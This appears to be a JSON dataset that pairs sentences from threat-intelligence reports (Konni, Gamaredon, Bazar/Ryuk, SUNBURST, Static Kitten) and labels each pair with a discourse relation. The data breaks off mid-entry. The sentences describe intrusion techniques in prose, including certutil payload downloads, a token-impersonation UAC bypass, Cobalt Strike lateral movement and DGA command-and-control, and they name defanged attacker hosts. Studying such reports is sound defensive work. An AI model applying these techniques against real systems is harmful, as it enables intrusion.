[
    {
        "S1": "In mid-July 2019 I encountered with an emerging campaign delivering the Konni malware.",
        "S2": "I used the James Forshaw\u2019s excellent blog [6] explaining in detail how to bypass UAC using the technique above.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor behind the campaign leveraged a malicious macro-armed Microsoft Word document titled: \u201c\u041e \u0441\u0438\u0442\u0443\u0430\u0446\u0438\u0438 \u043d\u0430 \u041a\u043e\u0440\u0435\u0439\u0441\u043a\u043e\u043c \u043f\u043e\u043b\u0443\u043e\u0441\u0442\u0440\u043e\u0432\u0435 \u0438 \u043f\u0435\u0440\u0441\u043f\u0435\u043a\u0442\u0438\u0432\u0430\u0445 \u0434\u0438\u0430\u043b\u043e\u0433\u0430 \u043c\u0435\u0436\u0434\u0443 \u0421\u0428\u0410 \u0438 \u041a\u041d\u0414\u0420\u201d (translated to: About the situation on the Korean Peninsula and the prospect of a dialogue between the United States and the DPRK).",
        "S2": "When analyzing the document, we see that the internal codepage of the lure document is 949 \u2014 ANSI/OEM Korean (Unified Hangul Code). indicating that the actor who created the document used Korean keyboard layout.",
        "relation": "ELABORATION"
    },
    {
        "S1": "When analyzing the document, we see that the internal codepage of the lure document is 949 \u2014 ANSI/OEM Korean (Unified Hangul Code). indicating that the actor who created the document used Korean keyboard layout.",
        "S2": "The lure document contains VBA macro code with the following capabilities:",
        "relation": "NEXT"
    },
    {
        "S1": "The lure document contains VBA macro code with the following capabilities:",
        "S2": "The document contains 3 hidden text boxes.",
        "relation": "MISC"
    },
    {
        "S1": "Each text box has a hexadecimal string constructed to a command that is executed once the document is opened by the victim.",
        "S2": "This file contains a Base64-encoded string with a custom key, the file is read and decoded by mshlpsrvc.dll to perform an outbound connection and download handicap[.]eu5[.]org/4.txt.",
        "relation": "MISC"
    },
    {
        "S1": "CMD silently copies certutil.exe into temp directory and rename it to \u201cmx.exe\u201d in an attempt to evade detection and then downloads 1.txt from from a remote resource: http://handicap.eu5[.]org.",
        "S2": "The threat actor removes tracks by silently deleting 1.txt from the temp directory and then executes 1.bat.",
        "relation": "NEXT"
    },
    {
        "S1": "The text file contains a base64 encoded string that is decoded by certutil and saved as 1.bat.",
        "S2": "Certutil is executed to download a txt file and decode its content.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor removes tracks by silently deleting 1.txt from the temp directory and then executes 1.bat.",
        "S2": "To check level of permissions, the threat actor uses net.exe.",
        "relation": "NEXT"
    },
    {
        "S1": "To check level of permissions, the threat actor uses net.exe.",
        "S2": "The technique used by the threat actor is a full fileless UAC bypass named \u201cCavalry\u201d that was leaked back in March 2017 to WikiLeaks as part of \u201cVault 7\u201d, a series of leaks on the US CIA that included sophisticated privilege escalation techniques used by several actors in the wild since the leakage [3].",
        "relation": "MISC"
    },
    {
        "S1": "mshlpweb.dll is a loader that uses a known token impersonation technique to elevate permissions and execute install.bat with high privileges.",
        "S2": "The technique used by the threat actor is a full fileless UAC bypass named \u201cCavalry\u201d that was leaked back in March 2017 to WikiLeaks as part of \u201cVault 7\u201d, a series of leaks on the US CIA that included sophisticated privilege escalation techniques used by several actors in the wild since the leakage [3].",
        "relation": "ELABORATION"
    },
    {
        "S1": "To gain higher privileges mshlpweb.dll execute the Windows Update Standalone Installer, wusa.exe.",
        "S2": "mshlpweb.dll contains an access token impersonation routine that duplicates the token of the high integrity instance of wusa.exe, and uses it to create a new cmd.exe process running under the security context of the impersonated user[2], which in turn execute the installer \u2014 install.bat.",
        "relation": "NEXT"
    },
    {
        "S1": "This process runs as a high-integrity process by default, since its set to auto-elevate within its manifest.",
        "S2": "This technique also bypasses UAC with the \u201cAlwaysNotify\u201d settings.",
        "relation": "MISC"
    },
    {
        "S1": "mshlpweb.dll utilize a set of standard windows API calls to duplicate the token of wusa.exe and use it to spawn high integrity instance of cmd.exe.",
        "S2": "New SID with medium privileges is created and set with NtSetInformationToken to the new duplicated token to lower its mandatory integrity level.",
        "relation": "NEXT"
    },
    {
        "S1": "This technique also bypasses UAC with the \u201cAlwaysNotify\u201d settings.",
        "S2": "The credentials passed as arguments to the function (Username: aaa, Domain: bbb, Password: ccc) are identical to the credentials specified in the UAC bypass implementation by FuzzySecurity, UAC-TokenMagic [4]",
        "relation": "MISC"
    },
    {
        "S1": "New SID with medium privileges is created and set with NtSetInformationToken to the new duplicated token to lower its mandatory integrity level.",
        "S2": "The new duplicated token is passed to ImpersonateLoggedOnUser.",
        "relation": "NEXT"
    },
    {
        "S1": "- COMSysApp service is added under the \u201cSvcHost\u201d key as a preliminary step to its execution in the context of svchost.exe.",
        "S2": "- COMSysApp service is restarted.",
        "relation": "NEXT"
    },
    {
        "S1": "The final payload (mshlpsrvc.dll), and its configuration file (mshlpsrvc.ini) are both copied into the system32 directory from the temp directory and then deleted.",
        "S2": "- The downloaded file, 4.txt, contains a base64 encoded string with the same custom key as used before.",
        "relation": "MISC"
    },
    {
        "S1": "mshlpsrvc.ini is a configuration file that was delivered together with mshlpsrv.dll in earlier stage of the attack.",
        "S2": "Following decoding, the file content appears to be the FTP credentials for the FTP service that acts as the command & control server for this attack.",
        "relation": "NEXT"
    },
    {
        "S1": "This file contains a Base64-encoded string with a custom key, the file is read and decoded by mshlpsrvc.dll to perform an outbound connection and download handicap[.]eu5[.]org/4.txt.",
        "S2": "- The downloaded file, 4.txt, contains a base64 encoded string with the same custom key as used before.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The following information is gathered from the affected machine and sent back to the control server:",
        "S2": "- files uploaded to the control server using \u201cstor\u201d command.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- The downloaded file, 4.txt, contains a base64 encoded string with the same custom key as used before.",
        "S2": "- The temp.cab is base64 encoded with the same custom key used earlier.",
        "relation": "LIST"
    },
    {
        "S1": "The case we found arrived through a targeted email that contained a document file (in docx format).",
        "S2": "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
        "relation": "MISC"
    },
    {
        "S1": "The case we found arrived through a targeted email that contained a document file (in docx format).",
        "S2": "The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).",
        "relation": "NEXT"
    },
    {
        "S1": "Opening document starts a template injection technique for loading the document template from the internet.",
        "S2": "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
        "relation": "MISC"
    },
    {
        "S1": "The downloaded document template contains the malicious macro codes, which executes a VBScript (VBS).",
        "S2": "The downloaded document template (in dot format) could differ slightly depending on each download.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
        "S2": "Opening this file (MITRE ATT&CK framework ID T1204) executes the template injection method (MITRE ATT&CK framework ID T1221).",
        "relation": "MISC"
    },
    {
        "S1": "The attacks we found all arrived through targeted emails (MITRE ATT&CK framework ID T1193).",
        "S2": "Our analysis found several URLs of the network destinations for both template injection and VBS.",
        "relation": "MISC"
    },
    {
        "S1": "One of them even had the subject \u201cCoronavirus (2019-nCoV).\u201d",
        "S2": "The email that used the coronavirus-related subject came with an attached document file.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Opening this file (MITRE ATT&CK framework ID T1204) executes the template injection method (MITRE ATT&CK framework ID T1221).",
        "S2": "This particular behavior is a slight departure from previously reported attacks by Gamaredon, which did not use this technique.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As mentioned, the template contains malicious macro (MITRE ATT&CK framework ID T1064), which exports VBS (MITRE ATT&CK framework ID T1064) to execute itself.",
        "S2": "If the file size of \u201c%APPDATA%\\\\Microsoft\\Windows\\Cookies.exe\u201d exceeds 4,485 bytes, it is executed.",
        "relation": "MISC"
    },
    {
        "S1": "PlayList.vbs contains the obfuscated codes (MITRE ATT&CK framework ID T1140), which it executes after decrypting the obfuscations.",
        "S2": "The observed routines of this VBS closely follow the other reports published on Gamaredon, such as the one from SentinelOne.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This particular behavior is a slight departure from previously reported attacks by Gamaredon, which did not use this technique.",
        "S2": "The observed routines of this VBS closely follow the other reports published on Gamaredon, such as the one from SentinelOne.",
        "relation": "MISC"
    },
    {
        "S1": "Interestingly, after decoding the VBS, we saw what appeared to be a programming mistake by the attacker.",
        "S2": "It shows that this malware is not tested enough, and may still be under development.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While resolving them to IP addresses to understand their attack bases, we also found that they were all linked to the following IP addresses.",
        "S2": "These IP addresses are from Russian hosting companies.",
        "relation": "ELABORATION"
    },
    {
        "S1": "While resolving them to IP addresses to understand their attack bases, we also found that they were all linked to the following IP addresses.",
        "S2": "Most likely, the attackers rented Virtual Private Server (VPS) as their attack base.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In this case, the actions began via a loader malware known as Bazar/Kegtap.",
        "S2": "From the initial execution of the payload, Bazar injects into various processes including explorer.exe and svchost.exe, as well as, spawning cmd.exe processes.",
        "relation": "NEXT"
    },
    {
        "S1": "From the initial execution of the payload, Bazar injects into various processes including explorer.exe and svchost.exe, as well as, spawning cmd.exe processes.",
        "S2": "After the initial discovery activity the Bazar malware stayed relatively quiet, until a second round of discovery the following day.",
        "relation": "NEXT"
    },
    {
        "S1": "After the initial discovery activity the Bazar malware stayed relatively quiet, until a second round of discovery the following day.",
        "S2": "In total, the campaign lasted 29 hours\u2013from initial execution of the Bazar, to domain wide ransomware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Next, the threat actor began to move laterally.",
        "S2": "From here forward, the threat actors relied on a Cobalt Strike beacon running on a domain controller as their main operations point.",
        "relation": "NEXT"
    },
    {
        "S1": "It took a few attempts, using various methods, from remote WMI, to remote service execution with PowerShell, until finally landing on Cobalt Strike beacon executable files transferred over SMB to move around the environment.",
        "S2": "In preparation for their final objectives, they used PowerShell to disable Windows Defender in the environment.",
        "relation": "NEXT"
    },
    {
        "S1": "It took a few attempts, using various methods, from remote WMI, to remote service execution with PowerShell, until finally landing on Cobalt Strike beacon executable files transferred over SMB to move around the environment.",
        "S2": "After picking the most reliable method to move through the environment, the threat actor then proceeded to establish beacons across the enterprise.",
        "relation": "NEXT"
    },
    {
        "S1": "From here forward, the threat actors relied on a Cobalt Strike beacon running on a domain controller as their main operations point.",
        "S2": "SMB was used to transfer the Ryuk executables.",
        "relation": "MISC"
    },
    {
        "S1": "After picking the most reliable method to move through the environment, the threat actor then proceeded to establish beacons across the enterprise.",
        "S2": "At this point Ryuk was transferred to the rest of the hosts in the environment via SMB and executed through an RDP connection from the pivot domain controller.",
        "relation": "NEXT"
    },
    {
        "S1": "In preparation for their final objectives, they used PowerShell to disable Windows Defender in the environment.",
        "S2": "However, once the Ryuk ransom executable was transferred over SMB from their domain controller (DC) pivot, it only took one minute to execute it.",
        "relation": "NEXT"
    },
    {
        "S1": "However, once the Ryuk ransom executable was transferred over SMB from their domain controller (DC) pivot, it only took one minute to execute it.",
        "S2": "The threat actors requested 600+ bitcoins, which have a market value of around 6+ million USD.",
        "relation": "NEXT"
    },
    {
        "S1": "In total, the campaign lasted 29 hours\u2013from initial execution of the Bazar, to domain wide ransomware.",
        "S2": "Initial delivery was via email with a link to the Bazar/Kegtap backdoor loader.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actors requested 600+ bitcoins, which have a market value of around 6+ million USD.",
        "S2": "The threat actors also performed process injection.",
        "relation": "MISC"
    },
    {
        "S1": "We downloaded and ran Document-Preview.exe, which connected to 5.182.210[.]145 over 443/https.",
        "S2": "AdFind and adf.bat were dropped and run minutes after Document-Preview.exe was executed.",
        "relation": "NEXT"
    },
    {
        "S1": "We downloaded and ran Document-Preview.exe, which connected to 5.182.210[.]145 over 443/https.",
        "S2": "We\u2019ve seen adf.bat numerous times and you can read more about it here.",
        "relation": "MISC"
    },
    {
        "S1": "WMI was used as well in an attempt to execute dlls laterally.",
        "S2": "WMI was used to check for the current AntiVirus on numerous systems",
        "relation": "LIST"
    },
    {
        "S1": "The threat actors also performed process injection.",
        "S2": "Afind was run again, and then the threat actor attempted to Kerberoast using Rubeus.",
        "relation": "MISC"
    },
    {
        "S1": "After a few false starts during lateral movement failures, the threat actors performed some additional local system recon.",
        "S2": "On day 1 the threat actors checked a domain controller for MS17-010 before continuing with more discovery.",
        "relation": "NEXT"
    },
    {
        "S1": "On day 1 the threat actors checked a domain controller for MS17-010 before continuing with more discovery.",
        "S2": "From there, the threat actor used WMIC to execute the beacon.",
        "relation": "NEXT"
    },
    {
        "S1": "Lateral movement began around 28 hours after initial entry, using SMB to drop a Cobalt Strike Beacon on a domain controller.",
        "S2": "This payload did not appear to run successfully, as shortly after the threat actors dropped an additional payload on the beachhead host, and then executed a service on the DC, after no command and control traffic was apparent.",
        "relation": "NEXT"
    },
    {
        "S1": "Following this, the treat actors copied and executed a Cobalt Strike beacon executable and initiated it via a service on the domain controller.",
        "S2": "The threat actor was having issues running beacons on numerous systems, and on at least one of the systems, they mounted the drive remotely.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The threat actor was having issues running beacons on numerous systems, and on at least one of the systems, they mounted the drive remotely.",
        "S2": "On the backup server, prior to execution, the threat actors pulled up the wbadmin msc console.",
        "relation": "NEXT"
    },
    {
        "S1": "On the backup server, prior to execution, the threat actors pulled up the wbadmin msc console.",
        "S2": "The threat actors asked for more than $6 million but were willing to negotiate.",
        "relation": "NEXT"
    },
    {
        "S1": "FireEye has uncovered a widespread campaign, that we are tracking as UNC2452.",
        "S2": "We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST.",
        "relation": "MISC"
    },
    {
        "S1": "The actors behind this campaign gained access to numerous public and private organizations around the world.",
        "S2": "This campaign may have begun as early as Spring 2020 and is currently ongoing.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They gained access to victims via trojanized updates to SolarWind\u2019s Orion IT monitoring and management software.",
        "S2": "SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This campaign may have begun as early as Spring 2020 and is currently ongoing.",
        "S2": "The campaign is the work of a highly skilled actor and the operation was conducted with significant operational security.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers.",
        "S2": "The backdoor uses multiple obfuscated blocklists to identify forensic and anti-virus tools running as processes, services, and drivers.",
        "relation": "NEXT"
    },
    {
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll is a SolarWinds digitally-signed component of the Orion software framework that contains a backdoor that communicates via HTTP to third party servers.",
        "S2": "The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity.",
        "relation": "NEXT"
    },
    {
        "S1": "We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST.",
        "S2": "The list of known malicious infrastructure is available on FireEye\u2019s GitHub page.",
        "relation": "MISC"
    },
    {
        "S1": "We are tracking the trojanized version of this SolarWinds Orion plug-in as SUNBURST.",
        "S2": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity.",
        "S2": "Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.msp",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware masquerades its network traffic as the Orion Improvement Program (OIP) protocol and stores reconnaissance results within legitimate plugin configuration files allowing it to blend in with legitimate SolarWinds activity.",
        "S2": "The trojanized update file is a standard Windows Installer Patch file that includes compressed resources associated with the update, including the trojanized SolarWinds.Orion.Core.BusinessLayer.dll component.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website, including: hxxps://downloads.solarwinds[.]com/solarwinds/CatalogResources/Core/2019.4/2019.4.5220.20574/SolarWinds-Core-v2019.4.5220-Hotfix5.msp",
        "S2": "The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.",
        "relation": "MISC"
    },
    {
        "S1": "The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.",
        "S2": "- Subdomain DomainName Generation Algorithm (DGA) is performed to vary DNS requests CNAME responses point to the C2 domain for the malware to connect to The IP block of A record responses controls malware behavior DGA encoded machine domain name, used to selectively target victims",
        "relation": "ELABORATION"
    },
    {
        "S1": "The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications.",
        "S2": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "S2": "- Command and control traffic masquerades as the legitimate Orion Improvement Program",
        "relation": "ELABORATION"
    },
    {
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "S2": "The backdoor\u2019s behavior and network protocol blend in with legitimate SolarWinds activity, such as by masquerading as the Orion Improvement Program (OIP) protocol and storing reconnaissance results within plugin configuration files.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll (b91ce2fa41029f6955bff20079468448) is a SolarWinds-signed plugin component of the Orion software framework that contains an obfuscated backdoor which communicates via HTTP to third party servers.",
        "S2": "After installation, the Orion software framework executes the .NET program SolarWinds.BusinessLayerHost.exe to load plugins, including SolarWinds.Orion.Core.BusinessLayer.dll.",
        "relation": "NEXT"
    },
    {
        "S1": "The backdoor\u2019s behavior and network protocol blend in with legitimate SolarWinds activity, such as by masquerading as the Orion Improvement Program (OIP) protocol and storing reconnaissance results within plugin configuration files.",
        "S2": "Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds\u2019s website.",
        "relation": "ELABORATION"
    },
    {
        "S1": "- Command and control traffic masquerades as the legitimate Orion Improvement Program",
        "S2": "Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds\u2019s website.",
        "relation": "MISC"
    },
    {
        "S1": "Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds\u2019s website.",
        "S2": "SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds, using the certificate with serial number 0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Authorized system administrators fetch and install updates to SolarWinds Orion via packages distributed by SolarWinds\u2019s website.",
        "S2": "After installation, the Orion software framework executes the .NET program SolarWinds.BusinessLayerHost.exe to load plugins, including SolarWinds.Orion.Core.BusinessLayer.dll.",
        "relation": "NEXT"
    },
    {
        "S1": "This plugin contains many legitimate namespaces, classes, and routines that implement functionality within the Orion framework.",
        "S2": "A record of generated domains is checked against a hardcoded list of IP address blocks which control the malware\u2019s behavior.",
        "relation": "MISC"
    },
    {
        "S1": "Code within the logically unrelated routine SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager.RefreshInternal invokes the backdoor code when the Inventory Manager plugin is loaded.",
        "S2": "The file was signed on March 24, 2020.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SolarWinds.Orion.Core.BusinessLayer.dll is signed by SolarWinds, using the certificate with serial number 0f:e9:73:75:20:22:a6:06:ad:f2:a3:6e:34:5d:c0:ed.",
        "S2": "The ReportWatcherPostpone key of appSettings is then read from SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the initial, legitimate value.",
        "relation": "MISC"
    },
    {
        "S1": "On execution of the malicious SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer.Initialize method the sample verifies that its lower case process name hashes to the value 17291806236368054941.",
        "S2": "The sample only executes if the filesystem write time of the assembly is at least 12 to 14 days prior to the current time; the exact threshold is selected randomly from an interval.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as a guard that only one instance is running before reading SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and retrieving the XML field appSettings.",
        "S2": "The key ReportWatcherRetry must be any value other than 3 for the sample to continue execution.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once the threshold is met, the sample creates the named pipe 583da945-62af-10e8-4902-a8f205c72b2e to act as a guard that only one instance is running before reading SolarWinds.Orion.Core.BusinessLayer.dll.config from disk and retrieving the XML field appSettings.",
        "S2": "The sample will delay for random intervals between the generation of domains; this interval may be any random value from the ranges 1 to 3 minutes, 30 to 120 minutes, or on error conditions up to 420 to 540 minutes (9 hours).",
        "relation": "ELABORATION"
    },
    {
        "S1": "The appSettings fields\u2019 keys are legitimate values that the malicious logic re-purposes as a persistent configuration.",
        "S2": "The ReportWatcherPostpone key of appSettings is then read from SolarWinds.Orion.Core.BusinessLayer.dll.config to retrieve the initial, legitimate value.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The sample checks that the machine is domain joined and retrieves the domain name before execution continues.",
        "S2": "The sample then invokes the method Update which is the core event loop of the sample.",
        "relation": "NEXT"
    },
    {
        "S1": "A userID is generated by computing the MD5 of a network interface MAC address that is up and not a loopback device, the domain name, and the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid.",
        "S2": "This operation is performed as the sample later bit packs flags into this field and the initial value must be known in order to read out the bit flags.",
        "relation": "NEXT"
    },
    {
        "S1": "The sample then invokes the method Update which is the core event loop of the sample.",
        "S2": "The Update method is responsible for initializing cryptographic helpers for the generation of these random C2 subdomains.",
        "relation": "NEXT"
    },
    {
        "S1": "The sample then invokes the method Update which is the core event loop of the sample.",
        "S2": "If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "The backdoor determines its C2 server using a Domain Generation Algorithm (DGA) to construct and resolve a subdomain of avsvmcloud[.]com.",
        "S2": "The attacker likely utilizes the DGA subdomain to vary the DNS response to victims as a means to control the targeting of the malware.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The Update method is responsible for initializing cryptographic helpers for the generation of these random C2 subdomains.",
        "S2": "If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Subdomains are generated by concatenating a victim userId with a reversible encoding of the victims local machine domain name.",
        "S2": "These subdomains are concatenated with one of the following to create the hostname to resolve:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attacker likely utilizes the DGA subdomain to vary the DNS response to victims as a means to control the targeting of the malware.",
        "S2": "Some entries in the service list if found on the system may affect the DGA algorithms behavior in terms of the values generated.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes.",
        "S2": "If any service was transitioned to disabled the Update method exits and retries later.",
        "relation": "LIST"
    },
    {
        "S1": "If a blocklisted process is found the Update routine exits and the sample will continue to try executing the routine until the blocklist passes.",
        "S2": "The sample retrieves a driver listing via the WMI query Select * From Win32_SystemDriver.",
        "relation": "NEXT"
    },
    {
        "S1": "Some entries in the service list if found on the system may affect the DGA algorithms behavior in terms of the values generated.",
        "S2": "If all blocklist and connectivity checks pass, the sample starts generating domains in a while loop via its DGA.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If any service was transitioned to disabled the Update method exits and retries later.",
        "S2": "If any blocklisted driver is seen the Update method exits and retries.",
        "relation": "LIST"
    },
    {
        "S1": "The sample retrieves a driver listing via the WMI query Select * From Win32_SystemDriver.",
        "S2": "If all blocklist tests pass, the sample tries to resolve api.solarwinds.com to test the network for connectivity.",
        "relation": "NEXT"
    },
    {
        "S1": "The sample will delay for random intervals between the generation of domains; this interval may be any random value from the ranges 1 to 3 minutes, 30 to 120 minutes, or on error conditions up to 420 to 540 minutes (9 hours).",
        "S2": "Once a domain has been successfully retrieved in a CNAME DNS response the sample will spawn a new thread of execution invoking the method HttpHelper.Initialize which is responsible for all C2 communications and dispatching.",
        "relation": "MISC"
    },
    {
        "S1": "Records within the following ranges will terminate the malware and update the configuration key ReportWatcherRetry to a value that prevents further execution:",
        "S2": "The malware uses HTTP GET or HTTP POST requests.",
        "relation": "MISC"
    },
    {
        "S1": "Once a domain has been successfully retrieved in a CNAME DNS response the sample will spawn a new thread of execution invoking the method HttpHelper.Initialize which is responsible for all C2 communications and dispatching.",
        "S2": "If the sample is attempting to send outbound data the content-type HTTP header will be set to \"application/octet-stream\" otherwise to \"application/json\".",
        "relation": "NEXT"
    },
    {
        "S1": "Malware response messages to send to the server are DEFLATE compressed and single-byte-XOR encoded, then split among the \u201cMessage\u201d fields in the \u201csteps\u201d array.",
        "S2": "Not all objects in the \u201csteps\u201d array contribute to the malware message \u2013 the integer in the \u201cTimestamp\u201d field must have the 0x2 bit set to indicate that the contents of the \u201cMessage\u201d field are used in the malware message.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We identified two lure ZIP files being used by Static Kitten designed to trick users into downloading a purported report on relations between Arab countries and Israel, or a file relating to scholarships.",
        "S2": "Anomali Threat Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We identified two lure ZIP files being used by Static Kitten designed to trick users into downloading a purported report on relations between Arab countries and Israel, or a file relating to scholarships.",
        "S2": "Static Kitten is distributing at least two URLs that deliver two different ZIP files that are themed to be relevant to government agency employees.",
        "relation": "ELABORATION"
    },
    {
        "S1": "We identified two lure ZIP files being used by Static Kitten designed to trick users into downloading a purported report on relations between Arab countries and Israel, or a file relating to scholarships.",
        "S2": "This EXE purports to be a report on Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Anomali Threat Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.",
        "S2": "Static Kitten\u2019s objective is to direct users to a downloader URL (ws.onehub[.]com/files/7w1372el which downloads a ZIP file) via a phishing email that impersonates an EXE (\u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod[.]gov.kw.exe).",
        "relation": "ELABORATION"
    },
    {
        "S1": "Anomali Threat Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.",
        "S2": "Between 2016 and 2020, we have seen ScreenConnect and Onehub used in malicious cyber activity by different, unassociated threat actors",
        "relation": "ELABORATION"
    },
    {
        "S1": "Anomali Threat Research has identified that Static Kitten is continuing to use Onehub to host a file containing ScreenConnect.",
        "S2": "This EXE purports to be a report on Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Static Kitten\u2019s objective is to direct users to a downloader URL (ws.onehub[.]com/files/7w1372el which downloads a ZIP file) via a phishing email that impersonates an EXE (\u062a\u062d\u0644\u064a\u0644 \u0648\u062f\u0631\u0627\u0633\u0629 \u062a\u0637\u0628\u064a\u0639 \u0627\u0644\u0639\u0644\u0627\u0642\u0627\u062a \u0627\u0644\u062f\u0648\u0644 \u0627\u0644\u0639\u0631\u0628\u064a\u0629 \u0648\u0627\u0633\u0631\u0627\u0626\u064a\u0644 httpsmod[.]gov.kw.exe).",
        "S2": "Static Kitten is distributing at least two URLs that deliver two different ZIP files that are themed to be relevant to government agency employees.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This EXE purports to be a report on Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.",
        "S2": "An EXE inside the ZIP of the same name will also begin the ScreenConnect installation process when executed.",
        "relation": "NEXT"
    },
    {
        "S1": "This EXE purports to be a report on Arabic countries and Israel relations but, when executed, actually launches the installation process for ScreenConnect.",
        "S2": "The .docx file shown in Figure 2 directly refers to government agency recipients while highlighting concerns about recent Iranian actions, the impact of the US elections, and joint studies by government entities on relations between Arabic countries and Israel.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Static Kitten is distributing at least two URLs that deliver two different ZIP files that are themed to be relevant to government agency employees.",
        "S2": "The geopolitical-themed ZIP contains an EXE file with the same name that begins the installation process for ScreenConnect when executed (see Figure 4).",
        "relation": "NEXT"
    },
    {
        "S1": "The .docx file shown in Figure 2 directly refers to government agency recipients while highlighting concerns about recent Iranian actions, the impact of the US elections, and joint studies by government entities on relations between Arabic countries and Israel.",
        "S2": "The hyperlink in the .docx file is impersonating the UAE National Media Council, however, the actual link directs to ws.onehub.com/files/7w1372el.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The actors reference multiple official agencies, including the General Secretariat of the Cooperation Council for the Arab States of the Gulf and the UAE National Media Council, likely in an effort to add the appearance of legitimacy.",
        "S2": "The hyperlink in the .docx file is impersonating the UAE National Media Council, however, the actual link directs to ws.onehub.com/files/7w1372el.",
